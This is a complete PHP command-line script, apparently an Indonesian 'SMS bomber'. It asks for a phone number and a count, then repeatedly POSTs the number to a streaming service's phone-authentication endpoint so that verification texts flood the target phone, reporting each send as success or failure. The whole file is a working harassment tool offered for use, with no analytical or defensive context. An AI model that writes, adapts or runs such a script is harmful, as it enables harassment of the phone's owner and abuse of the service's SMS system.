<?php

/* zeraneL */

function send($no){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,"https://api.bioskoponline.com/auth/phone");
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, "phone=".$no);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $server_output = curl_exec($ch);
  curl_close ($ch);
  
  return $server_output;
}

echo "Nomor (08xxx): ";
$no = trim(fgets(STDIN));
echo "Jumlah: ";
$jumlah = trim(fgets(STDIN));

for($i = 0; $i<$jumlah; $i++){
  $kirim = send($no);
  $result = json_decode($kirim);
  echo "[".($i+1)."] ";
  if($result->message){
    echo "Sukses mengirim ke ".$no;
  }else{
    echo "Gagal mengirim ke ".$no;
  }
  echo "\n";
}
  
?>